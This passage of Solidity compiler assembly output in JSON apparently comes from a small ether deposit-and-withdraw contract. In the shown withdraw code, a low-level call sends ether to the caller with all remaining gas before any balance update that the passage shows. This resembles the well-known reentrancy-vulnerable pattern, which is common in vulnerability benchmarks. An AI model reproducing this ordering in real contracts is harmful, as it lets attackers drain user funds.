											"begin": 230,
											"end": 337,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 301,
											"end": 329,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 319,
											"end": 328,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 301,
											"end": 309,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 310,
											"end": 313,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 301,
											"end": 314,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 301,
											"end": 314,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 301,
											"end": 318,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 301,
											"end": 318,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 329,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 301,
											"end": 329,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 329,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 301,
											"end": 329,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 301,
											"end": 329,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 301,
											"end": 329,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 301,
											"end": 329,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 285,
											"end": 293,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 294,
											"end": 297,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 285,
											"end": 298,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 285,
											"end": 298,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 285,
											"end": 329,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 285,
											"end": 329,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 285,
											"end": 329,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 285,
											"end": 329,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 178,
											"end": 221,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 545,
											"end": 552,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 529,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 530,
											"end": 540,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 541,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 521,
											"end": 541,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 552,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 517,
											"end": 747,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 517,
											"end": 747,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 570,
											"end": 581,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 596,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 586,
											"end": 601,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 586,
											"end": 601,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 609,
											"end": 616,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "JUMPI",
											"source": 1
										},
										{
